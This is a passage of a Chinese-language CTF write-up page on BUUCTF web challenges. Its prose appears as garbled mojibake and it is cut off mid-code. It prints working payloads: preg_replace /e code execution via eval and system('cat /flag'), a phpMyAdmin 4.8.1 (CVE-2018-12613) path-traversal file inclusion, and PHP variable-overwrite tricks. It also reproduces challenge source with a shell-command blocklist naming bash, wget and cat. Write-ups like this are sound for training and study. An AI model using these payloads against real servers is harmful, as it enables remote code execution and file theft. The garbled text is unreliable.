class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æƒ³åˆ°ä¼ªåè®®çš„åŸå› æ˜¯å› ä¸ºè®¿é—®next.phpçš„æ—¶å€™ï¼Œè®¿é—®ä¸äº†ï¼Œè€Œä¸”è¿™é‡Œè¿˜æ˜¯ä¸ªinclude</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?text=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></span><br><span class="line">data:<span class="comment">//text/plain,..(æ³¨æ„æŠ“åŒ…çš„æ—¶å€™ï¼Œ$textå‚æ•°é‡Œçš„ç©ºæ ¼æ˜¯%20)   è¿™ä¸ªä¼ªåè®®ä¹Ÿè¡Œ</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406212130699.png" alt="image-20230406212130699"></p><p>æ‹¿åˆ°äº†next.phpçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æ¶‰åŠåˆ°<code>preg_replace</code>çš„ä¸€ä¸ªRCEæ¼æ´   <a href="https://xz.aliyun.com/t/2557">preg_replaceRCE</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯æ„é€ <code>preg_replace(&#39;.*&#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;æ­¤å¤„å¡«å‡½æ•°å&#125;&#125;);</code><br>å¤§æ¦‚å°±æ˜¯æŠŠæ‰€æœ‰å­—ç¬¦æ›¿æ¢ä¸ºå‡½æ•°æ‰§è¡Œç»“æœã€‚<br>ä½†æ˜¯GETä¼ <code>.*=xxx</code>ä¼šå‡ºé—®é¢˜ï¼Œè‡ªåŠ¨å°†ç¬¬ä¸€ä¸ªéæ³•å­—ç¬¦è½¬åŒ–ä¸ºä¸‹åˆ’çº¿ï¼ˆçœ‹é“¾æ¥ï¼‰ï¼Œæ‰€ä»¥æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//755f7227-48c2-4d56-91a8-c2c6b5518680.node3.buuoj.cn/next.php?\S*=$&#123;eval($_POST[cmd])&#125;</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶postä¸€ä¸ª<code>cmd=system(&quot;cat /flag&quot;);</code></p><p>\S*è¡¨ç¤ºè¿ç»­åŒ¹é…å¤šä¸ªéç©ºç™½å­—ç¬¦</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;<span class="title function_ invoke__">getFlag</span>()&#125;&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p>é¢˜ç›®</p><p>è€ƒç‚¹ï¼šphpadmin 4.8.1è¿œç¨‹<a href="https://so.csdn.net/so/search?q=æ–‡ä»¶åŒ…å«æ¼æ´&amp;spm=1001.2101.3001.7020">æ–‡ä»¶åŒ…å«æ¼æ´</a>ï¼ˆCVE-2018-12613ï¼‰</p><p><img src="../images/image-20230406225519111.png" alt="image-20230406225519111"></p><p>è¿™é‡Œæ‰«ç›®å½•æ‰«å‡ºæ¥phpmyadmin</p><p><img src="../images/image-20230406225757816.png" alt="image-20230406225757816"></p><p>çœ‹åˆ°ç‰ˆæœ¬å·</p><p><a href="https://www.jianshu.com/p/0d75017c154f">phpmyadmin4.8.1è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCVE-2018-12613ï¼‰</a></p><p><a href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">ã€é¦–å‘ã€‘phpmyadmin4.8.1åå°getshell</a></p><p>ä¸Šé¢çš„ä¸¤ä¸ªé“¾æ¥æ˜¯å¯¹è¿™ä¸ªæ¼æ´çš„è®²è§£ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯è¿™ä¸ªæ¼æ´çš„æºæ–‡ä»¶ï¼ˆindex.phpï¼‰å­˜åœ¨è§£ç æ¼æ´ï¼Œæºç å†…å¯¹urlè¿›è¡Œäº†ï¼Ÿçš„åˆ†å‰²ï¼Œåœ¨åˆ†å‰²å‰ï¼Œåˆå¯¹å‚æ•°è¿›è¡Œäº†urldecode,ä¸”å¦‚æœ?å·å‰é¢çš„æ–‡ä»¶å°±æ˜¯tagetåœ¨ç™½åå•é‡Œï¼Œå°±å¯ä»¥ç»•è¿‡ï¼Œè¿™æ ·æˆ‘ä»¬ä¸€æ˜¯ä»¤target=db_sql.phpï¼Œè€Œæ˜¯åœ¨ä¼ å‚ä½¿å¯¹?è¿›è¡ŒäºŒæ¬¡urlç¼–ç ï¼Œå³?å˜ä¸º%253f</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406230040730.png" alt="image-20230406230040730"></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230406230218432.png" alt="image-20230406230218432"></p><p>æ˜¯ä¸€ä¸ªç½‘ç«™</p><p>æ‰«ä¸€ä¸‹ç½‘å€å‘ç°/.git    ç„¶åçŒœæµ‹æ˜¯ä¸æ˜¯gitæºç æ³„éœ²</p><p>ç”¨GitHackæ¥æµ‹è¯•ä¸€ä¸‹</p><p>å‘ç°å­˜åœ¨æºç æ³„éœ²</p><p><img src="../images/image-20230406231502698.png" alt="image-20230406231502698"></p><p>ç„¶åè¯»å–å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;ã€€ã€€ã€€ã€€</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>  ;  <span class="comment">//post å£°æ˜è‡³å½“å‰æ–‡ä»¶</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;ã€€ã€€ã€€ </span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;  <span class="comment">//GETå‹å˜é‡é‡æ–°èµ‹å€¼ä¸ºå½“å‰æ–‡ä»¶å˜é‡ä¸­ä»¥å…¶å€¼ä¸ºé”®åçš„å€¼</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;ã€€ <span class="comment">//ä¼ å…¥çš„å˜é‡ä¸ºflag   valueä¸æ˜¯flag</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;   </span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>exit è¾“å‡ºä¸€æ¡æ¶ˆæ¯ï¼Œå¹¶é€€å‡ºå½“å‰è„šæœ¬</strong></p><p><img src="../images/image-20230407204057358.png" alt="image-20230407204057358"></p><p>æˆ‘ä»¬è¿›è¡Œä»£ç å®¡è®¡ åœ¨è¿™å…³æˆ‘ä»¬ç»•è¿‡ä¸‰ä¸ª if å‡½æ•° ç›´æ¥echo æ˜æ˜¾ä¸ç°å® æ‰€ä»¥çªç ´ç‚¹å°±æ˜¯é‚£ä¸‰ä¸ª exit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ä¸Šé¢æˆ‘ä»¬è¦æƒ³ç»•è¿‡ éœ€è¦</span><br><span class="line"></span><br><span class="line">getä¸­å‚æ•°å¿…é¡»å«æœ‰ $ x åŒæ—¶$ xä¸èƒ½å«æœ‰flag</span><br><span class="line">å­˜åœ¨getå‚æ•° æˆ–è€… å­˜åœ¨postå‚æ•°</span><br><span class="line">postå‚æ•°æ’ç­‰äº  flag æˆ–è€… getå‚æ•°æ’ç­‰äº falg</span><br><span class="line">å½“æˆ‘ä»¬åˆ°è¾¾æœ€åçš„æ—¶å€™falä¹Ÿè¢«é‡ç½®äº†</span><br></pre></td></tr></table></figure><p>å¯å˜å˜é‡ï¼šå¦‚æœä¸€ä¸ªå˜é‡ä¿å­˜çš„å€¼åˆšå¥½æ˜¯å¦å¤–ä¸€ä¸ªå˜é‡çš„åå­—ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥é€šè¿‡è®¿é—®ä¸€ä¸ªå˜é‡å¾—åˆ°å¦å¤–ä¸€ä¸ªå˜é‡çš„å€¼ï¼šåœ¨å˜é‡ä¹‹å‰å†å¤šåŠ ä¸€ä¸ª $ ç¬¦å·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;bb&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>; </span><br><span class="line"><span class="comment">// è¾“å‡º bb   1.æ‰¾åˆ° $a,è§£æç»“æœï¼šb    2.æ‰¾åˆ°$b,è§£æç»“æœ bb</span></span><br></pre></td></tr></table></figure><p>æœ¬å…³çš„æ ¸å¿ƒä»£ç ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;ã€€ã€€ã€€ã€€</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>  ;  <span class="comment">//post å£°æ˜è‡³å½“å‰æ–‡ä»¶</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> x =&gt; <span class="variable">$y</span>)&#123;ã€€ã€€ã€€ </span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;  <span class="comment">//GETå‹å˜é‡é‡æ–°èµ‹å€¼ä¸ºå½“å‰æ–‡ä»¶å˜é‡ä¸­ä»¥å…¶å€¼ä¸ºé”®åçš„å€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ foreach è¿›è¡Œå˜é‡é‡è¦†ç›–</p><p>åœ¨è¿™ä¸€å…³å¯ä»¥æ‰§è¡Œè¾“å‡ºå†…å®¹åœ°æ–¹æœ‰ä¸¤ä¸ªå‡½æ•° exit å’Œ echo</p><p>ç¬¬ä¸€ä¸ª exitï¼ˆæœ€åè®²ï¼‰</p><p><strong>ç¬¬äºŒä¸ª exitâ€”â€”è¦†ç›– yds</strong><br>æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯è®©flagå˜é‡è¦†ç›–åˆ°ydsä¸Šï¼Œåœ¨æ‰§è¡Œexit($yds);<br>çš„æ—¶å€™è¾“å‡ºflag</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;ã€€ã€€ã€€ </span><br><span class="line">   <span class="variable">$$x</span> = <span class="variable">$$y</span>;  <span class="comment">//GETå‹å˜é‡é‡æ–°èµ‹å€¼ä¸ºå½“å‰æ–‡ä»¶å˜é‡ä¸­ä»¥å…¶å€¼&gt;ä¸ºé”®åçš„å€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»–è¾“å‡º<code>$yds</code>ã€‚æˆ‘ä»¬åªéœ€è®©<code>$yds=$flag</code>å°±å¥½äº†<br>ç”±äºæˆ‘ä»¬è¾“å…¥çš„å˜é‡æ˜¯yds=flag<br>æ‰€ä»¥<code>$x</code>=yds <code>$y</code>=flag<br><code>$$x</code>= <code>$$y</code> æ‰€ä»¥ <code>$yds=$flag</code><br>flagå˜é‡å°±æ˜¯ æˆ‘ä»¬è¦çš„ä¸œè¥¿<br>exit($yds)ã€‚å°±æ˜¯echo $flagã€‚</p><p><strong>ç¬¬ä¸‰ä¸ªâ€”â€”è¦†ç›– is</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><p>å‰åŠæ®µå’Œå‰é¢çš„æ–¹æ³•åŸç†ç›¸åŒï¼Œè®©flagè¦†ç›–is<br>åé¢çš„<code>flag=flag</code>â€”&gt;<code>$flag</code>=<code>$flag</code> ç›®çš„æ˜¯ä¸ºäº†ç¬¦åˆç¬¬ä¸‰ä¸ªiféœ€æ±‚ï¼š<code>ï¼ˆ$_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;)</code><br>è¿›è€Œè¾“å‡º flag</p><p><strong>ç¬¬ä¸€ä¸ªâ€”â€”è¦†ç›–handsome</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=x&amp;x=flag</span><br></pre></td></tr></table></figure><p>handsome=flagä¸ç”¨è¯´ å°±æ˜¯è®©<code>$handsome</code>=<code>$flag</code><br>åé¢çš„ç›®çš„å°±æ˜¯è®©æˆ‘ä»¬ä¼ å…¥çš„å˜é‡æ˜¯ flag å€¼ä¸æ˜¯flag è¿›è€Œèƒ½å¤Ÿexit handsome</p><blockquote><p>è¿™é‡Œçš„å€¼è¡¨é¢æ˜¯ x ä½†å‰é¢æˆ‘ä»¬è¿›è¡Œäº†å˜é‡è¦†ç›–ä½¿å¾— x=flag æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬è¾“å‡ºxçš„å€¼å°±æ˜¯flagçš„å€¼</p></blockquote><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230407205459073.png" alt="image-20230407205459073"></p><p>å‘ç°ä»–çš„urlæœ‰ç‚¹çŒ«è…»</p><p><img src="../images/image-20230407205741174.png" alt="image-20230407205741174"></p><p>ä¸€ä¸ªimgä¸€ä¸ªcmd</p><p>æŠŠimgé‡Œé¢çš„ä¸œè¥¿è¿›è¡Œè§£ç æŸ¥çœ‹ä¸€ä¸‹</p><p><img src="../images/image-20230407205834321.png" alt="image-20230407205834321"></p><p>ç»è¿‡ä¸¤æ¬¡base64å’Œä¸€æ¬¡16è¿›åˆ¶è§£ç å¾—åˆ°   é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹è¿›è¡Œindex.phpçš„æŸ¥çœ‹   é€†ç€ç¼–ç å°±è¡Œäº†</p><p>æŸ¥çœ‹æºç ï¼Œå¹¶è¿›è¡Œbase64è§£ç å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æºç è§£è¯»ï¼Œå¯ä»¥å‘ç°fileå‚æ•°çš„ä½œç”¨åº”è¯¥å°±æ˜¯ç”¨æ¥è¯»è¿™ä¸ªæºç çš„ï¼Œä¸‹é¢åº”è¯¥ç”¨ä¸åˆ°ä»–äº†ï¼Œç°åœ¨ä¸»è¦å°±æ˜¯ä¼ cmdå‚æ•°å’Œpostçš„aå’Œbã€‚</p><p>é¦–å…ˆæ˜¯cmdå‚æ•°çš„è¿‡æ»¤é—®é¢˜ï¼Œä»–è¿‡æ»¤äº†æˆ‘æ‰€çŸ¥é“çš„æ‰€æœ‰èƒ½æŸ¥çœ‹æ–‡ä»¶çš„å‘½ä»¤ï¼Œæ‰€ä»¥è¿™ä¸ªåœ°æ–¹èƒ½ç»•è¿‡å°±æ›´å¥½äº†ï¼Œå®é™…ä¸Šè¿™çš„ç¡®æ˜¯å¯ä»¥ç»•è¿‡çš„ã€‚</p><p>èƒ½ç»•è¿‡çš„å…³é”®å°±å‡ºåœ¨åæ–œæ ä¸Šï¼Œä¸Šæµ‹è¯•ç»“æœå°±çŸ¥é“äº†ã€‚</p><p><strong>æœ¬åœ°æµ‹è¯•ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span 